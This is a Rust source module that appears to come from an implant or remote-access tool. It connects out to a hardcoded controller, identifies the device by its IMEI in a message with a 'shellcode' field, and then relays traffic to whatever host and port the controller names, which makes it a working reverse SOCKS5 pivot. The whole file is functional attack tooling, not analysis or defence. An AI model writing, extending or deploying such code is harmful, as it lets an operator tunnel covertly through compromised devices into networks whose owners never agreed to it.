
pub mod reverse_socks5 {
    use std::io::{copy, Read, Write};
    use std::net::{Ipv4Addr, Shutdown, TcpStream};
    use std::str::FromStr;
    use std::sync::{Arc, Mutex};
    use std::thread;
    use crate::{REVERSE_SOCKS5_ADDR, REVERSE_SOCKS5_PORT};
    use crate::communication::common_frequency::{Message, PROXY_INIT_SIG};
    use crate::sys::system::*;

    pub fn spawn_reverse_proxy_sock_channel(current_socks5_channel_size: Arc<Mutex<i32>>) {
        thread::spawn({
            move || {
                match TcpStream::connect(
                    format!(
                        "{}:{}", REVERSE_SOCKS5_ADDR, REVERSE_SOCKS5_PORT
                    )
                ) {
                    Ok(mut stream) => {

                        let mut payload: Vec<u8> = vec![];
                        bson::to_document(&Message {imei: get_device_imei(), shellcode: PROXY_INIT_SIG})
                            .unwrap().to_writer(&mut payload).unwrap();
                        stream.write(&payload).unwrap();

                        let mut destination_ip_buf: [u8; 4] = [0; 4];
                        let mut destination_port_buf: [u8; 2] = [0; 2];

                        {
                            stream.read(&mut destination_ip_buf).unwrap();
                            stream.read(&mut destination_port_buf).unwrap();
                        }

                        let destination_ip = Ipv4Addr::new(
                            destination_ip_buf[0], destination_ip_buf[1], destination_ip_buf[2], destination_ip_buf[3]
                        );
                        let destination_port = u16::from_be_bytes(destination_port_buf);

                        {
                            *current_socks5_channel_size.lock().unwrap() -= 1;
                        }

                        stream.write(&[0x01]).unwrap();

                        match TcpStream::connect(
                            format!(
                                "{}:{}", destination_ip, destination_port
                            )
                        ) {
                            Ok(remote) => {
                                let local_sock = remote.local_addr().unwrap();
                                let local_ip = Ipv4Addr::from_str(local_sock.ip().to_string().as_str()).unwrap();
                                let local_ip_u32: u32 = local_ip.into();
                                let local_port = local_sock.port();

                                let mut reply: Vec<u8> = vec![];
                                {
                                    reply.extend(5_u8.to_be_bytes().to_vec());
                                    reply.extend(0_u8.to_be_bytes().to_vec());
                                    reply.extend(0_u8.to_be_bytes().to_vec());
                                    reply.extend(1_u8.to_be_bytes().to_vec());
                                    reply.extend(local_ip_u32.to_be_bytes().to_vec());
                                    reply.extend(local_port.to_be_bytes().to_vec());
                                }

                                stream.write_all(&reply as &[u8]).unwrap();

                                let mut stream_clone = stream.try_clone().unwrap();
                                let mut remote_clone = remote.try_clone().unwrap();
                                let outgoing = thread::spawn(move || -> std::io::Result<()> {
                                    copy(&mut stream_clone, &mut remote_clone)?;
                                    Ok(())
                                });

                                let mut stream_clone = stream.try_clone().unwrap();
                                let mut remote_clone = remote.try_clone().unwrap();
                                let incoming = thread::spawn(move || -> std::io::Result<()> {
                                    copy(&mut remote_clone, &mut stream_clone)?;
                                    Ok(())
                                });

                                _ = outgoing.join();
                                _ = incoming.join();

                                match stream.shutdown(Shutdown::Both) {
                                    Ok(n) => {}
                                    Err(_) => {}
                                }
                                match remote.shutdown(Shutdown::Both) {
                                    Ok(n) => {}
                                    Err(_) => {}
                                }
                            }
                            Err(_) => {
                                return
                            }
                        }
                    }
                    Err(_) => {
                        if *current_socks5_channel_size.lock().unwrap() > 0 {
                            *current_socks5_channel_size.lock().unwrap() -= 1;
                        }
                        return
                    }
                }
            }
        });
    }
}